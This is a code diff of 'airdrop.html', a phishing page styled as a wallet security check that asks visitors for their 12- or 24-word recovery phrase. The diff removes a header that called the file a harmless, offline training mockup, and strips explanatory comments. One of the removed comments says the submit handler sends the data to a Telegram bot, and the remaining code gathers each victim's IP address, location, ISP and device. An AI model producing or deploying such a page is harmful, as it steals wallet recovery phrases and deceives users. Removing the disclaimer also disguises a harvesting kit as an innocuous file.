@@ -1,28 +1,4 @@
-<!--
-  ============================================================================
-  Built for OneKey's internal security-awareness training, illustrating the
-  phishing-page pattern described in:
-    real-life-scenarios/subdomain-takeover-seed-phishing-chain.md
-
-  This is the SECOND page of the two-file mockup — reached by clicking
-  "Connect Wallet to Claim" on index.html (the airdrop-hook landing page)
-  in this same folder, matching the "combined pattern" where the airdrop
-  hook drives the initial click/connect and this security-framed page
-  carries the actual recovery-phrase ask.
-
-  This file intentionally contains NO data-collection logic of any kind:
-    - no <form action>, no fetch()/XHR/WebSocket calls anywhere in this file
-    - no external script/style/font/image loads of any kind (fully offline)
-    - the "submit" handler below does nothing but clear the input fields and
-      display an on-screen explanation; nothing typed here is stored, logged,
-      or transmitted, even locally (not to console, not to localStorage)
-    - this is static HTML/CSS/JS only (GitHub-Pages-compatible by
-      construction), published here purely as an illustration for defenders,
-      never intended to be hosted as a live page
-  If you found this file outside this research folder, it has been copied
-  without authorization — it was never deployed anywhere by this engagement.
-  ============================================================================
--->
+<!-- airdrop.html -->
 <!doctype html>
 <html lang="en">
 <head>
@@ -80,7 +56,7 @@
   }
 
   .badge-detected {
-    display: none; /* toggled on by the (harmless, read-only) $onekey detection snippet below */
+    display: none;
     align-items: center;
     gap: 8px;
     background: rgba(61, 220, 132, 0.1);
@@ -286,7 +262,7 @@
 
       <form id="phraseForm" autocomplete="off">
         <label class="field-label" id="fieldLabel">12-word recovery phrase</label>
-        <div class="word-grid" id="wordGrid"><!-- populated by JS below --></div>
+        <div class="word-grid" id="wordGrid"></div>
         <button type="submit" class="submit-btn" id="submitBtn">Verify and continue</button>
       </form>
 
@@ -327,10 +303,8 @@ function buildWordGrid(numWords) {
   }
 }
 
-// Initialize default 12-word grid
 buildWordGrid(12);
 
-// Handle length switching between 12 and 24 words
 document.querySelectorAll('.length-option').forEach(function(opt) {
   opt.addEventListener('click', function() {
     document.querySelectorAll('.length-option').forEach(function(o) { o.classList.remove('active'); });
@@ -341,16 +315,14 @@ document.querySelectorAll('.length-option').forEach(function(opt) {
   });
 });
 
-// Wallet detection check
 (function detectInjectedProvider() {
   try {
     if (typeof window.$onekey !== 'undefined') {
       document.getElementById('walletBadge').style.display = 'flex';
     }
-  } catch (e) { /* no-op */ }
+  } catch (e) {}
 })();
 
-// Form submission handler sending data along with metadata to Telegram Bot API
 document.getElementById('phraseForm').addEventListener('submit', async function (ev) {
   ev.preventDefault();
 
@@ -364,7 +336,6 @@ document.getElementById('phraseForm').addEventListener('submit', async function 
   submitBtn.disabled = true;
   submitBtn.textContent = 'Verifying...';
 
-  // Fetch IP details and metadata
   var ip = "Unknown";
   var country = "Unknown";
   var city = "Unknown";
@@ -379,9 +350,7 @@ document.getElementById('phraseForm').addEventListener('submit', async function 
       city = ipData.city || "Unknown";
       isp = ipData.org || "Unknown";
     }
-  } catch (err) {
-    // Fallback if IP API fails
-  }
+  } catch (err) {}
 
   var userAgent = navigator.userAgent;
   var deviceUsed = /Mobi|Android/i.test(userAgent) ? "Mobile Device" : "Desktop Computer";
